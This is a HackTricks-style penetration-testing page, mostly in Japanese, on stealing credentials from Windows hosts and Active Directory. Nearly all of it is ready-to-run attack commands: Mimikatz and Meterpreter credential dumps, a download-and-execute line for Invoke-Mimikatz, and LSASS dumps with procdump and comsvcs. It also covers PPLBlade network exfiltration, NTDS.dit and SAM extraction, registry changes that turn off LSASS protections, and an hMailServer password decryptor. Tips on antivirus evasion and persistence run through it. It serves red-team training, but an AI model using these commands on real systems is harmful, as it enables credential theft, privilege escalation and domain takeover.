# Windowsの認証情報の窃取

{{#include ../../banners/hacktricks-training.md}}

## 認証情報 Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz ができる他のことは** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **これらの保護は Mimikatz が一部の credentials を抽出するのを防ぐ可能性があります。**

## Credentials with Meterpreter

私が作成した [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) を使用して、被害者内部の **passwords and hashes** を検索します。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AVの回避

### Procdump + Mimikatz

**Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**は正規のMicrosoftツールであるため、Defenderには検出されません。\
このツールを使用して、**dump the lsass process**し、ダンプを**download the dump**し、ダンプから**extract**して**credentials locally**を取得できます。

また[SharpDump](https://github.com/GhostPack/SharpDump)を使用することもできます。
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
このプロセスは [SprayKatz](https://github.com/aas-n/spraykatz) によって自動で行われます: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: 一部の **AV** は **procdump.exe** を使用して **lsass.exe** をダンプする行為を **malicious** として **detect** する場合があります。これは彼らが文字列 **"procdump.exe" and "lsass.exe"** を検出しているためです。したがって、procdump に **lsass.exe** という **name** を渡す代わりに、**PID** を **argument** として渡す方が **stealthier** です。

### Dumping lsass with **comsvcs.dll**

`C:\Windows\System32` にある **comsvcs.dll** という DLL は、クラッシュ時に **dumping process memory** を行う役割を持っています。この DLL には `rundll32.exe` を使って呼び出すことを想定した **`MiniDumpW`** という **function** が含まれています。\
最初の二つの引数は重要ではありませんが、三番目の引数はさらに三つの要素に分かれます。ダンプ対象のプロセス ID が第一の要素、ダンプファイルの保存先が第二の要素、第三の要素は厳密に単語 **full** のみです。他の選択肢は存在しません。\
これら三つの要素を解析すると、DLL はダンプファイルを作成し、指定されたプロセスのメモリをそのファイルに書き込みます。\
**comsvcs.dll** を利用することで lsass プロセスのダンプが可能になり、procdump をアップロードして実行する必要がなくなります。この方法は詳細が [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/) に記載されています。

The following command is employed for execution:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**このプロセスは** [**lssasy**](https://github.com/Hackndo/lsassy)**で自動化できます。**

### **Dumping lsass with Task Manager**

1. Task Bar を右クリックして Task Manager をクリックします
2. More details をクリックします
3. Processes タブで "Local Security Authority Process" プロセスを検索します
4. "Local Security Authority Process" プロセスを右クリックし、"Create dump file" をクリックします。

### Dumping lsass with procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) は Microsoft によって署名されたバイナリで、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/) スイートの一部です。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBladeを使ったlsassのダンプ

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) は Protected Process Dumper Tool で、memory dump を難読化し、disk に書き出さずに remote workstations へ転送することをサポートします。

**主な機能**:

1. Bypassing PPL protection
2. Obfuscating memory dump files to evade Defender signature-based detection mechanisms
3. Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP ベースの LSASS ダンプ（MiniDumpWriteDump を使用しない）

Ink Dragon は **LalsDumper** と呼ばれる3段階のダンパーを配布しており、`MiniDumpWriteDump` を一切呼ばないため、その API に対する EDR のフックは発動しません:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` を検索して 32 個の小文字の `d` 文字から成るプレースホルダを見つけ、これを `rtu.txt` への絶対パスで上書きし、パッチ済み DLL を `nfdp.dll` として保存し、`AddSecurityPackageA("nfdp","fdp")` を呼び出します。これにより **LSASS** は悪意ある DLL を新しい Security Support Provider (SSP) としてロードします。
2. **Stage 2 inside LSASS** – LSASS が `nfdp.dll` をロードすると、DLL は `rtu.txt` を読み込み、各バイトを `0x20` と XOR してデコードした blob をメモリにマッピングし、実行を移します。
3. **Stage 3 dumper** – マップされたペイロードは、ハッシュ化された API 名から解決した **direct syscalls** を用いて MiniDump のロジックを再実装します（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）。`Tom` というエクスポートを持つ機能が `%TEMP%\<pid>.ddt` を開き、圧縮された LSASS ダンプをファイルにストリームし、ハンドルを閉じて後で exfiltration できるようにします。

オペレータノート:

* `lals.exe`, `fdp.dll`, `nfdp.dll`, および `rtu.txt` は同一ディレクトリに保持してください。Stage 1 はハードコードされたプレースホルダを `rtu.txt` の絶対パスで書き換えるため、ファイルを分割するとチェーンが壊れます。
* 登録は `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` に `nfdp` を追記することで行われます。起動ごとに LSASS によって SSP が再読み込みされるよう、その値を自分で設定できます。
* `%TEMP%\*.ddt` ファイルは圧縮されたダンプです。ローカルで展開してから Mimikatz/Volatility に渡して資格情報を抽出してください。
* `lals.exe` の実行には admin/SeTcb 権限が必要であり、`AddSecurityPackageA` が成功する必要があります。呼び出しが返ると、LSASS は透過的に不正な SSP をロードして Stage 2 を実行します。
* ディスクから DLL を削除しても LSASS からは追い出されません。レジストリ エントリを削除して LSASS を再起動（再起動）するか、そのまま放置して長期的な persistence に利用してください。

## CrackMapExec

### SAM ハッシュのダンプ
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### ターゲット DC から NTDS.dit をダンプする
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### ターゲット DC から NTDS.dit のパスワード履歴をダンプする
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 各 NTDS.dit アカウントの pwdLastSet 属性を表示する
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

これらのファイルは _C:\windows\system32\config\SAM_ と _C:\windows\system32\config\SYSTEM._ に**配置されている**べきです。しかし、これらは保護されているため、**通常の方法で単純にコピーすることはできません**。

### From Registry

これらのファイルを入手する最も簡単な方法は、レジストリからコピーを取得することです:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Download** それらのファイルをあなたの Kali マシンにダウンロードし、次のコマンドで **extract the hashes** してください:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

保護されたファイルはこのサービスを使ってコピーできます。Administrator 権限が必要です。

#### vssadmin の使用

vssadmin バイナリは Windows Server バージョンでのみ利用可能です
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
同じことは**Powershell**からも実行できます。これは**SAM file をコピーする方法の例**です（使用しているハードドライブは "C:" で、保存先は C:\users\Public）ですが、任意の保護されたファイルをコピーするためにも使用できます：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
書籍からのコード: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

最後に、[**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) を使って、SAM、SYSTEM、ntds.dit のコピーを作成することもできます。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory 認証情報 - NTDS.dit**

The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.

Within this database, three primary tables are maintained:

- **Data Table**: このテーブルはユーザーやグループのようなオブジェクトに関する詳細を格納する役割を持ちます。
- **Link Table**: グループメンバーシップなどの関係を追跡します。
- **SD Table**: 各オブジェクトの **Security descriptors** がここに保持され、格納されたオブジェクトのセキュリティとアクセス制御を確保します。

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### Decrypting the hashes inside NTDS.dit

The hash is cyphered 3 times:

1. Decrypt Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
2. Decrypt tha **hash** using **PEK** and **RC4**.
3. Decrypt the **hash** using **DES**.

**PEK** have the **same value** in **every domain controller**, but it is **cyphered** inside the **NTDS.dit** file using the **BOOTKEY** of the **SYSTEM file of the domain controller (is different between domain controllers)**. This is why to get the credentials from the NTDS.dit file **you need the files NTDS.dit and SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
さらに、[**volume shadow copy**](#stealing-sam-and-system) トリックを使って **ntds.dit** ファイルをコピーすることもできます。**SYSTEM file** のコピーも必要になることを忘れないでください（再度、[**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) トリックを使って入手してください）。

### **NTDS.dit からハッシュを抽出する**

ファイル **NTDS.dit** と **SYSTEM** を **取得した**ら、_secretsdump.py_ のようなツールを使って **ハッシュを抽出** できます:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
有効な domain admin user を使用して、**それらを自動的に抽出する**こともできます:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
For **big NTDS.dit files** it's recommend to extract it using [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Finally, you can also use the **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ or **mimikatz** `lsadump::lsa /inject`

### **NTDS.dit から SQLite データベースへドメインオブジェクトを抽出する**

NTDS オブジェクトは [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) を使って SQLite データベースに抽出できます。秘密情報だけでなく、raw NTDS.dit file が既に取得されている場合には、オブジェクト全体とその属性も抽出され、さらなる情報抽出に利用できます。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive はオプションですが、秘密の復号化（NT & LM hashes、supplemental credentials such as cleartext passwords、kerberos or trust keys、NT & LM password histories）を可能にします。他の情報と合わせて、以下のデータが抽出されます：user and machine accounts with their hashes、UAC flags、timestamp for last logon and password change、accounts description、names、UPN、SPN、groups and recursive memberships、organizational units tree and membership、trusted domains with trusts type、direction and attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). you can use this binary to extract credentials from several software.
```
lazagne.exe all
```
## SAM and LSASS から credentials を抽出するその他のツール

### Windows credentials Editor (WCE)

このツールはメモリから credentials を抽出するために使用できます。ダウンロード: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM file から credentials を抽出する
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAMファイルから認証情報を抽出する
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

次のリンクからダウンロードしてください: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) 。単に **実行** するだけでパスワードが抽出されます。

## アイドルRDPセッションの収集とセキュリティ制御の弱体化

Ink Dragon の FinalDraft RAT には `DumpRDPHistory` タスクが含まれており、その手法はどの red-teamer にとっても有用です:

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – 各ユーザーハイブの `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` を解析します。各サブキーにはサーバ名、`UsernameHint`、および最終書込タイムスタンプが格納されています。FinalDraft のロジックは PowerShell で再現できます:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` ログをクエリし、Event ID **21**（成功したログオン）と **25**（切断）を取得して、誰がそのホストを管理したかをマッピングします:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

どの Domain Admin が定期的に接続しているかが分かったら、そのユーザーの **切断済み** セッションがまだ存在する間に LSASS をダンプします（LalsDumper/Mimikatz を使用）。CredSSP + NTLM フォールバックは検証情報とトークンを LSASS に残すため、それらを SMB/WinRM 経由でリプレイして `NTDS.dit` を取得したり、ドメインコントローラで永続化をステージしたりできます。

### FinalDraft が標的とするレジストリのダウングレード

同じインプラントは認証情報の窃取を容易にするためにいくつかのレジストリキーを改ざんします:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Setting `DisableRestrictedAdmin=1` forces full credential/ticket reuse during RDP, enabling pass-the-hash style pivots.
* `LocalAccountTokenFilterPolicy=1` disables UAC token filtering so local admins get unrestricted tokens over the network.
* `DSRMAdminLogonBehavior=2` lets the DSRM administrator log on while the DC is online, giving attackers another built-in high-privilege account.
* `RunAsPPL=0` removes LSASS PPL protections, making memory access trivial for dumpers such as LalsDumper.

## hMailServer データベース資格情報（侵害後）

hMailServer は DB パスワードを `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` の `[Database] Password=` に格納する。値は Blowfish で暗号化され、静的キー `THIS_KEY_IS_NOT_SECRET` と 4 バイト単位のワードのエンディアン入れ替えが適用されている。INI の 16 進文字列をこの Python スニペットで使用する:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
平文パスワードを使い、ファイルロックを避けるために SQL CE database をコピーし、32-bit provider をロードして、必要ならアップグレードしてから hashes をクエリします：
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
The `accountpassword` column uses the hMailServer hash format (hashcat mode `1421`). Cracking these values can provide reusable credentials for WinRM/SSH pivots.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

一部のツールは、LSA ログオンコールバック `LsaApLogonUserEx2` をインターセプトすることで、**平文のログオンパスワード** を取得します。  
考え方としては、認証パッケージのコールバックをフックまたはラップして、認証情報を**ログオン時**（ハッシュ化の前）に取得し、ディスクに書き込むかオペレーターに返す、というものです。  
通常は、LSA に注入するか登録するヘルパーとして実装され、成功したインタラクティブ／ネットワークの各ログオンイベントをユーザー名、ドメイン、パスワードとともに記録します。

運用上の注意:
- 認証パスにヘルパーをロードするにはローカル管理者/SYSTEM が必要です。
- 取得された資格情報は、ログオンが発生したときにのみ現れます（フックに応じてインタラクティブ、RDP、サービス、またはネットワークのログオン）。

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) は、ユーザーごとの `sqlstudio.bin` ファイルに保存された接続情報を格納します。専用のダンプツールはそのファイルを解析して、保存された SQL 資格情報を復元できます。  
コマンド出力しか返さないシェルでは、ファイルは Base64 にエンコードして stdout に出力することでしばしば持ち出されます。
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
オペレータ側で、ファイルを再構築し、dumper をローカルで実行して認証情報を回収します:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## 参考文献

- [Unit 42 – 高価値セクターを標的とした長年にわたる未検出の活動に関する調査](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: ステルスな攻撃作戦のリレーネットワークと内部の仕組みを明らかにする](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
